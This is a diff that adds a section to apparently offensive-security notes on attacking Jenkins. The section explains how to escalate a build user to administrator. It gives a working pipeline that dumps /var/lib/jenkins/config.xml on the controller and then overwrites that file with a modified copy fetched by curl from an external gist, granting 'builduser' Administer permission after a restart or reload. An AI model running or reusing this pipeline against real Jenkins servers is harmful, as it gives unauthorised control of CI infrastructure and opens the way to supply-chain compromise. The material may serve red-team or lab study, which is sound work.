@@ -109,3 +109,32 @@ pipeline {
 
 
 ## Give extra permissions to user by modifying the config.xml file
+
+- The 1st condition for this attack is that the build has to run on the Built-In node , i.e on the Controller.
+- The 2nd condition is that either we need a restart or a reload of configuration data from disk.
+- We will dump the config.xml
+- We will modify the config.xml to add builduser as admin ``` <permission>USER:hudson.model.Hudson.Administer:builduser</permission> ```
+- Next we will run a pipeline that will download and replace the config.xml with the modified xml
+- From the next restart or reloading of config data, our changes will take effect.
+
+```
+pipeline{
+    agent any
+    stages{
+        stage("Dump config.xml file"){
+            steps{
+                sh '''
+                    cat /var/lib/jenkins/config.xml
+                '''
+            }
+        }
+        stage("Replace the modified config.xml file"){
+            steps{
+                sh '''
+                    curl -o /var/lib/jenkins/config.xml https://gist.githubusercontent.com/dibsy/1548ae721e687cc86b9d4a95cc3bafa5/raw/2a3693b17c638f27f1be56af62d85de0309144cb/configModified.xml
+                '''
+            }
+        }        
+    }
+}
+```
